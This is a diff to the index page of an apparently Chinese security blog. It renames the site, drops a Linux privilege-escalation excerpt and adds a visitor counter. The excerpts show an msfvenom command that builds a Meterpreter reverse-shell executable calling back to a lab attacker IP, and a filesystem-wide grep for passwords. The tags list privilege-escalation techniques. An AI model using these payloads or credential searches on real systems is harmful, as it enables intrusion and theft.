@@ -17,7 +17,7 @@
   <meta name="description" content="">
   <meta name="author" content="John Doe">
   <meta name="keywords" content="">
-  <title>心上人是心上人</title>
+  <title>SE_Null</title>
 
   <link  rel="stylesheet" href="https://cdn.staticfile.org/twitter-bootstrap/4.4.1/css/bootstrap.min.css" />
 
@@ -47,7 +47,7 @@
     <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
   <div class="container">
     <a class="navbar-brand"
-       href="/">&nbsp;<strong>心上人是心上人</strong>&nbsp;</a>
+       href="/">&nbsp;<strong>SE_Null</strong>&nbsp;</a>
 
     <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
             data-target="#navbarSupportedContent"
@@ -176,70 +176,6 @@
     
     <article class="col-12 col-md-12 mx-auto index-info">
       <h1 class="index-header">
-        <a href="/2020/10/01/linux%E6%8F%90%E6%9D%83-%E6%99%AE%E9%80%9A%E7%94%A8%E6%88%B7-root/">linux提权(普通用户-root)</a>
-      </h1>
-
-      <p class="index-excerpt">
-        <a href="/2020/10/01/linux%E6%8F%90%E6%9D%83-%E6%99%AE%E9%80%9A%E7%94%A8%E6%88%B7-root/">
-          
-          
-            
-          
-          
-1.密码相关操作1.查找带有密码相关的文件grep –color=auto -rnw ‘/‘ -ie  “PASSWORD” –color=always 2&gt; /dev/null
-2.查看过期的密码/etc/security/opasswd
-id：查看权限
-3.查看用户最后编辑的文件find / -mmin -10 2&gt;/dev/null |grep -Ev “^/proc”
-4.查
-        </a>
-      </p>
-
-      <div class="index-btm post-metas">
-        
-          <div class="post-meta mr-3">
-            <i class="iconfont icon-date"></i>
-            <time datetime="2020-10-01 15:51" pubdate>
-              2020-10-01
-            </time>
-          </div>
-        
-        
-          <div class="post-meta mr-3">
-            <i class="iconfont icon-category"></i>
-            
-              <a href="/categories/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8/">内网安全</a>
-            
-          </div>
-        
-        
-          <div class="post-meta">
-            <i class="iconfont icon-tags"></i>
-            
-              <a href="/tags/%E5%AF%86%E7%A0%81%E7%9B%B8%E5%85%B3%E6%93%8D%E4%BD%9C%E8%BF%9B%E8%A1%8C%E6%8F%90%E6%9D%83/">密码相关操作进行提权</a>
-            
-              <a href="/tags/%E8%AE%A1%E5%88%92%E4%BB%BB%E5%8A%A1-corn%E8%BF%9B%E8%A1%8C%E6%8F%90%E6%9D%83/">计划任务 corn进行提权</a>
-            
-              <a href="/tags/%E5%86%85%E6%A0%B8%E6%BC%8F%E6%B4%9E%E6%8F%90%E6%9D%83/">内核漏洞提权</a>
-            
-              <a href="/tags/sudo%E6%8F%90%E6%9D%83/">sudo提权</a>
-            
-              <a href="/tags/suid%E6%8F%90%E6%9D%83/">suid提权 </a>
-            
-              <a href="/tags/%E5%88%A9%E7%94%A8%E5%8F%AF%E5%86%99%E6%96%87%E4%BB%B6%E6%8F%90%E6%9D%83/">利用可写文件提权</a>
-            
-              <a href="/tags/%E6%95%8F%E6%84%9F%E7%BB%84%E6%8F%90%E6%9D%83/">敏感组提权</a>
-            
-          </div>
-        
-      </div>
-    </article>
-  </div>
-
-  <div class="row mx-auto index-card">
-    
-    
-    <article class="col-12 col-md-12 mx-auto index-info">
-      <h1 class="index-header">
         <a href="/2020/10/01/windows%E6%8F%90%E6%9D%83/">windows提权</a>
       </h1>
 
@@ -252,7 +188,7 @@ id：查看权限
           1.msf提权目标：windows 7 sp1 vl：192.168.8.53
 攻击机：kali ：192.168.8.195
 生成木马：msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.8.195 lport=1234 -f exe &gt;1.exe
-1.直接提取getsystem：在目标非管理员时候会失败
+1.直接提权getsystem：在目标非管理员时候会失败
 meterprete
         </a>
       </p>
@@ -286,7 +222,7 @@ meterprete
             
               <a href="/tags/%E5%91%BD%E4%BB%A4%E6%8F%90%E6%9D%83-at%E3%80%81sc/">命令提权(at、sc)</a>
             
-              <a href="/tags/%E9%85%8D%E7%BD%AE%E9%94%99%E8%AF%AF%E5%AF%BC%E8%87%B4%E6%8F%90%E6%9D%83/">配置错误导致提权</a>
+              <a href="/tags/%E9%85%8D%E7%BD%AE%E9%94%99%E8%AF%AF%E5%AF%BC%E8%87%B4%E6%8F%90%E6%9D%83-%E4%B8%8D%E5%B8%A6%E5%BC%95%E5%8F%B7%E7%9A%84%E7%9A%84%E8%B7%AF%E5%BE%84%E6%9C%8D%E5%8A%A1%E3%80%81%E5%BC%B1%E6%96%87%E4%BB%B6%E5%A4%B9%E6%9D%83%E9%99%90%E3%80%81%E4%B8%8D%E5%AE%89%E5%85%A8%E7%9A%84%E6%9C%8D%E5%8A%A1%E6%9D%83%E9%99%90%E3%80%81%E6%B3%A8%E5%86%8C%E8%A1%A8%E6%9D%83%E9%99%90%E4%B8%8D%E8%B6%B3%E3%80%81AlwaysInstallElevated%E3%80%81Unattended-Installs/">配置错误导致提权(不带引号的的路径服务、弱文件夹权限、不安全的服务权限、注册表权限不足、AlwaysInstallElevated、Unattended Installs)</a>
             
               <a href="/tags/powerup%E5%B7%A5%E5%85%B7%E6%8F%90%E6%9D%83/">powerup工具提权</a>
             
@@ -294,7 +230,9 @@ meterprete
             
               <a href="/tags/dll%E6%B3%A8%E5%85%A5/">dll注入</a>
             
-              <a href="/tags/%E6%95%B0%E6%8D%AE%E5%BA%93%E6%8F%90%E6%9D%83-mysql%E3%80%81sql-server/">数据库提权(mysql、sql server)</a>
+              <a href="/tags/mysql%E6%8F%90%E6%9D%83-sqlmap%E3%80%81udf%E3%80%81%E5%90%AF%E5%8A%A8%E9%A1%B9%E3%80%81mof/">mysql提权(sqlmap、udf、启动项、mof)</a>
+            
+              <a href="/tags/sql-server%E6%8F%90%E6%9D%83-xp-cmdshell%E3%80%81sp-oacreate%E3%80%81sp-oamethod/">sql server提权(xp_cmdshell、sp_oacreate、sp_oamethod)</a>
             
           </div>
         
@@ -427,6 +365,30 @@ meterprete
         <span>Fluid</span></a>
     </div> -->
     
+  <div class="statistics">
+    
+    
+
+    
+      
+        <!-- 不蒜子统计PV -->
+        <span id="busuanzi_container_site_pv" style="display: none">
+            总访问量 
+            <span id="busuanzi_value_site_pv"></span>
+             次
+          </span>
+      
+      
+        <!-- 不蒜子统计UV -->
+        <span id="busuanzi_container_site_uv" style="display: none">
+            总访客数 
+            <span id="busuanzi_value_site_uv"></span>
+             人
+          </span>
+      
+    
+  </div>
+
 
     
 
@@ -457,6 +419,8 @@ meterprete
   <script  src="/js/clipboard-use.js" ></script>
 
 
+
+  <script defer src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" ></script>
 
 
 
